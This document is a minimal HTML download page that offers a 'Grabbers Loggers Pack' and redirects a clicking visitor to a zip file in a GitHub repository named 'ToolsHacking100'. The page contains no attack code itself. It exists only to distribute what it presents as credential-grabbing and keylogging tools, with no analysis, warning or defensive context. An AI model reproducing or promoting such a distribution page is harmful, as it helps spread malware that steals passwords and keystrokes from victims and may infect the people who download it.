<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download</title>
    <link rel="stylesheet" href="style.css?v=2">
</head>
<body>

    <div class="container">
        <h1>Grabbers Loggers Pack</h1>
        <p class="subtitle">Grabbers Loggers Pack</p>

        <button class="download-btn" onclick="downloadFile()">
            ⬇ Download
        </button>

        <div class="loader" id="loader"></div>
    </div>

    <script>
        function downloadFile() {
            const loader = document.getElementById("loader");
            loader.style.display = "block";

            setTimeout(() => {
                window.location.href = "https://github.com/kraker691-create/ToolsHacking100/raw/refs/heads/main/Grabbers%20Loggers%20Pack.zip";
            }, 1200);
        }
    </script>

</body>
</html>
